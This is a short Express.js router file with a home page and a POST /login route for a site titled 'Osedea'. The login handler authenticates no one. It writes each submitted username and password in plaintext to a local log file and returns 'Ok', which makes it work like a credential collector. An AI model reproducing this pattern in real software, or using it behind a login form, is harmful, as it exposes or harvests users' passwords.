var express = require('express');
var router = express.Router();
var fs = require('fs')

var bodyParser = require('body-parser')
router.use( bodyParser.json() );
router.use(bodyParser.urlencoded({
  extended: true
}));

/* GET home page. */
router.get('/', function(req, res, next) {
  res.render('index', { title: 'Osedea' });
});

/* POST login. (the page who shoud... do something with the username/password ) */
router.post('/login', function(req, res) {
  var accessLogStream = fs.createWriteStream(__dirname + '/../log/access.log', {flags: 'a'})
  accessLogStream.write("{username: '" + req.body.username + "', password: '" + req.body.password + "'}\n\r");
  accessLogStream.close();
  res.send('Ok')
});

module.exports = router;
